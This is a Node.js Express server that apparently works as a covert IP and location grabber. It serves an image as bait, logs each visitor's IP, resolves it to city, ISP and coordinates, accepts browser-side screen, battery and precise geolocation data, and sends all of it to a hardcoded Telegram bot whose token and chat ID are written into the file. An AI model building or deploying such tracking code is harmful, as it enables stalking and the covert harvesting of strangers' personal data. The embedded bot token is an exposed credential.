const express = require("express");
const axios = require("axios");
const fs = require("fs");
const app = express();

const port = process.env.PORT || 3000;

// Telegram Bot details
const telegramBotToken = "8054463444:AAGU44U27Hly1LPgMqM2H_5fYwVQCbgLFME";
const telegramChatId = "1387832458";

app.use(express.json());
app.use(express.static(__dirname));

// Default route
app.get("/", (req, res) => {
  res.sendFile(__dirname + "/image.jpg");
});

// IP tracking route
app.get("/track-image", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const timestamp = new Date().toISOString();

  try {
    const ipData = await axios.get(`http://ip-api.com/json/${ip}`);
    const {
      country = "Unknown",
      countryCode = "",
      regionName = "Unknown",
      city = "Unknown",
      zip = "",
      lat = "Unknown",
      lon = "Unknown",
      timezone = "Unknown",
      isp = "Unknown",
      org = "Unknown",
      as = "Unknown",
    } = ipData.data;

    const userAgent = req.headers["user-agent"] || "Unknown";
    const language = req.headers["accept-language"] || "Unknown";
    const referer = req.headers["referer"] || "Direct Link";
    const host = req.headers["host"] || "Unknown";

    const log = `IP: ${ip} | Time: ${timestamp}\n`;
    fs.appendFile("ip_logs.txt", log, (err) => {
      if (err) console.error("Log error:", err);
    });

    // Send back the image
    res.sendFile(__dirname + "/image.jpg");

    // Prepare basic message
    const basicInfo = {
      ip,
      timestamp,
      country,
      regionName,
      city,
      zip,
      lat,
      lon,
      timezone,
      isp,
      org,
      as,
      userAgent,
      language,
      referer,
      host,
    };

    // Save to use later when client sends details
    global.lastVisitor = basicInfo;
  } catch (err) {
    console.error("Tracking error:", err.message);
    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: `❌ Error fetching IP info for: ${ip} - ${err.message}`,
        },
      }
    );

    res.sendFile(__dirname + "/image.jpg");
  }
});

// Route for browser-side info
app.post("/log-info", async (req, res) => {
  const { screen, battery, geo, timezone } = req.body;
  const data = global.lastVisitor || {};

  const message = `
📡 New Visitor Logged!

🕒 Time: ${data.timestamp}
🌐 IP: ${data.ip}
📍 Location: ${data.city}, ${data.regionName}, ${data.country}
🏢 ISP: ${data.isp}
🧭 Timezone: ${timezone || data.timezone}
🖥️ Device: ${data.userAgent}
🗣️ Language: ${data.language}
🖼️ Screen: ${screen || "N/A"}
🔋 Battery: ${battery || "N/A"}
📌 Geolocation: ${geo || "User denied access"}
📍 Latitude: ${geo?.split(",")[0]?.replace("Lat: ", "") || "N/A"}
📍 Longitude: ${geo?.split(",")[1]?.replace("Lon: ", "") || "N/A"}
🔗 Referer: ${data.referer}
🧷 Host: ${data.host}
`;

  try {
    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: message,
        },
      }
    );
  } catch (err) {
    console.error("Telegram Error:", err.message);
  }

  res.sendStatus(200);
});

app.listen(port, () => {
  console.log(`✅ Server running on port ${port}`);
});
